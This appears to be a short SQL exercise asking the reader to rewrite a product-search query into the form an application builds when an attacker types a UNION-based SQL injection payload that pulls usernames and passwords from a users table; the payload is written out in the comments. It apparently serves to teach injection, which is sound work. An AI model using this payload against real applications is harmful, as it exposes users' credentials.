-- This is an ordinary product search -- what the box is meant to do.
-- Rewrite it into the query the app builds when the attacker types
--     none%' UNION SELECT username, password FROM users --
-- into the search box, so the users' credentials come back in place of products.
SELECT name, price FROM product WHERE name LIKE '%Paper%';
